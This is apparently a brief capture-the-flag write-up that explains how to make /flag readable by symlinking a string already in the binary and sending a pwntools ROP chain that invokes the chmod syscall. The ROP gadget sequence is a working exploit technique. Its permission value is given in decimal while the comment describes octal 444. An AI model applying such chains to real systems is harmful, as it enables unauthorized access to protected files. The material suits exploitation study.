In this challenge there is no address leak which means we cannot enter own string. So we will have to make do with whatever string is present in the binary. 

There are several strings present there so we can choose any one and create a symlink to /flag with the name as that of the string.

Next we can use chmod syscall to change the permission of /flag by calling chmod on symlink. 
Permission changes does not affect symlink but only what it is linked to and in this case that is the flag.

```python
str = next(elf.search(b"call"))

rop.raw(pop_rsi)
rop.raw(444)    # read permission for all three
rop.raw(pop_rdi)
rop.raw(str)       # address of string
rop.raw(pop_rax)
rop.raw(0x5A)       # syscall number for chmod
rop.raw(syscall)

```

This will change the permission of flag file so that it is now readable by everyone.
